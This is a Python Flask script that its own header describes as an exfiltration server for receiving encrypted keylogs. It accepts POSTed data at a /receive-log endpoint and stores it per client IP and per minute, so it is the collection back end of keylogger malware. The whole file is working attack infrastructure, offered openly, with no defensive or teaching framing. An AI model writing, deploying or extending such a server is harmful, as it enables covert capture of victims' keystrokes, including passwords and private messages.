# Enhanced exfiltration server for receiving encrypted keylogs via POST (with IP & per-minute grouping)

from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

# Base directory to store received logs
LOG_DIR = "received_logs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/receive-log', methods=['POST'])
def receive_log():
    encrypted_data = request.data

    if not encrypted_data:
        return "No data received", 400

    # Get client IP
    client_ip = request.remote_addr.replace(":", "_")  # avoid issues with ":" in IPv6

    # Ensure directory for this IP exists
    ip_dir = os.path.join(LOG_DIR, client_ip)
    os.makedirs(ip_dir, exist_ok=True)

    # Use timestamp rounded to minute
    timestamp = datetime.now().strftime('%Y%m%d-%H%M')  # e.g. 20250731-2010

    # Filepath: received_logs/<ip>/log-<minute>.bin
    log_file_path = os.path.join(ip_dir, f"log-{timestamp}.bin")

    # Append to log file for that minute
    with open(log_file_path, "ab") as f:
        f.write(encrypted_data + b"\n")  # add newline for readability if binary chunks are small

    print(f"✅ [{client_ip}] Log saved to {log_file_path}")
    return "✅ Log received", 200

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5001)
